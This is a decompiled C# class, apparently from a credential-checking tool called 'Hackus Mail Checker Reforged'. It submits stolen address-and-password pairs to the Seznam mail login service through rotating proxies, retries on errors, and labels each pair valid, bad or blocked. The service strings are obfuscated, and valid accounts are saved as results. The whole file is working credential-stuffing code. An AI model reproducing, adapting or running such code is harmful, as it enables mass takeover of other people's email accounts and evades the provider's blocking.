using System;
using System.Threading;
using Hackus_Mail_Checker_Reforged.Models;
using Hackus_Mail_Checker_Reforged.Models.Enums;
using Hackus_Mail_Checker_Reforged.Services.Managers;
using Hackus_Mail_Checker_Reforged.Services.Settings;
using Newtonsoft.Json;
using xNet;

namespace Hackus_Mail_Checker_Reforged.Net
{
	// Token: 0x020000B1 RID: 177
	public class SeznamClient
	{
		// Token: 0x17000138 RID: 312
		// (get) Token: 0x060005A0 RID: 1440 RVA: 0x00006D62 File Offset: 0x00004F62
		private SearchSettings SearchSettings
		{
			get
			{
				return SearchSettings.Instance;
			}
		}

		// Token: 0x060005A1 RID: 1441 RVA: 0x00009CA2 File Offset: 0x00007EA2
		public SeznamClient(Mailbox mailbox)
		{
			this._mailbox = mailbox;
		}

		// Token: 0x060005A2 RID: 1442 RVA: 0x00023998 File Offset: 0x00021B98
		public void Handle()
		{
			if (this._mailbox.Address == null)
			{
				return;
			}
			OperationResult operationResult = this.Login();
			StatisticsManager.Instance.Increment(operationResult);
			FileManager.SaveStatistics(this._mailbox.Address, this._mailbox.Password, operationResult);
			if (operationResult == OperationResult.Ok && !SearchSettings.Instance.Search)
			{
				MailManager.Instance.AddResult(new MailboxResult(this._mailbox));
			}
		}

		// Token: 0x060005A3 RID: 1443 RVA: 0x00023A08 File Offset: 0x00021C08
		private OperationResult Login()
		{
			OperationResult operationResult;
			do
			{
				this.Reset();
				operationResult = this.Authenticate();
			}
			while (operationResult == OperationResult.HttpError);
			return operationResult;
		}

		// Token: 0x060005A4 RID: 1444 RVA: 0x00023A28 File Offset: 0x00021C28
		private OperationResult Authenticate()
		{
			this.WaitPause();
			try
			{
				using (HttpRequest httpRequest = new HttpRequest())
				{
					this.SetHeaders(httpRequest);
					httpRequest.AllowAutoRedirect = false;
					string text = JsonConvert.SerializeObject(new
					{
						username = this._mailbox.Address,
						password = this._mailbox.Password,
						service = <Module>.smethod_6<string>(1848814709),
						return_url = <Module>.smethod_4<string>(-872950308)
					});
					string text2 = httpRequest.Post(<Module>.smethod_4<string>(1233356625), text, <Module>.smethod_4<string>(-423852883)).ToString();
					if (text2.ContainsOneIgnoreCase(new string[]
					{
						<Module>.smethod_6<string>(220166365),
						<Module>.smethod_3<string>(401681461),
						<Module>.smethod_5<string>(-1676814541),
						<Module>.smethod_3<string>(-1564920533)
					}))
					{
						return OperationResult.Blocked;
					}
					if (text2.ContainsOneIgnoreCase(new string[]
					{
						<Module>.smethod_2<string>(383658666),
						<Module>.smethod_3<string>(-1805453592)
					}))
					{
						return OperationResult.Bad;
					}
					if (text2.Contains(<Module>.smethod_2<string>(568625173)))
					{
						return OperationResult.Ok;
					}
					if (text2.Contains(<Module>.smethod_4<string>(2003387409)))
					{
						return OperationResult.HttpError;
					}
					return OperationResult.Error;
				}
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch
			{
			}
			return OperationResult.HttpError;
		}

		// Token: 0x060005A5 RID: 1445 RVA: 0x00023BA8 File Offset: 0x00021DA8
		private void SetHeaders(HttpRequest request)
		{
			request.IgnoreProtocolErrors = true;
			request.ConnectTimeout = CheckerSettings.Instance.Timeout * 1000;
			request.Cookies = this._cookies;
			request.Proxy = this._proxyClient;
			request.UserAgent = <Module>.smethod_5<string>(1482021352);
			request.AddHeader(<Module>.smethod_6<string>(-452519608), <Module>.smethod_5<string>(1409696498));
			request.AddHeader(<Module>.smethod_3<string>(-1607191919), <Module>.smethod_6<string>(-1488460431));
		}

		// Token: 0x060005A6 RID: 1446 RVA: 0x00009CB1 File Offset: 0x00007EB1
		private void Reset()
		{
			this._cookies = new CookieDictionary(false);
			if (ProxySettings.Instance.UseProxy)
			{
				this._proxyClient = ProxyManager.Instance.GetProxy();
			}
		}

		// Token: 0x060005A7 RID: 1447 RVA: 0x00009AC8 File Offset: 0x00007CC8
		private void WaitPause()
		{
			ThreadsManager.Instance.WaitHandle.WaitOne();
		}

		// Token: 0x040002F4 RID: 756
		private Mailbox _mailbox;

		// Token: 0x040002F5 RID: 757
		private ProxyClient _proxyClient;

		// Token: 0x040002F6 RID: 758
		private CookieDictionary _cookies;
	}
}
